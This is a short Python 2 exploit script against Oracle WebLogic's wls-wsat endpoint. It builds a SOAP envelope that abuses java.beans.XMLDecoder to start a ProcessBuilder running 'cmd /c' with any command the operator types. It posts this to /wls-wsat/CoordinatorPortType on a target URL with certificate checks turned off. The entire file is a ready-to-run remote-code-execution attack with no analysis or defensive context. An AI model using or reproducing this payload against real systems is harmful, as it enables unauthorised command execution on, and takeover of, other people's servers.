import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def payload_command (command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>cmd</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>/c</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       " \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"
    return payload_1


def do_post(url_in, command_in):
    payload_url = url_in + "/wls-wsat/CoordinatorPortType"
    payload_header = {'content-type': 'text/xml'}
    result = requests.post(payload_url, payload_command(command_in ),headers = payload_header,verify=False)
    if result.status_code == 500:
        print "Command Executed \n"
    else:
        print "Something Went Wrong \n"


if __name__ == '__main__':
    command_in = raw_input("Enter your command here: ")
    url_in = sys.argv[1]
do_post(url_in, command_in)
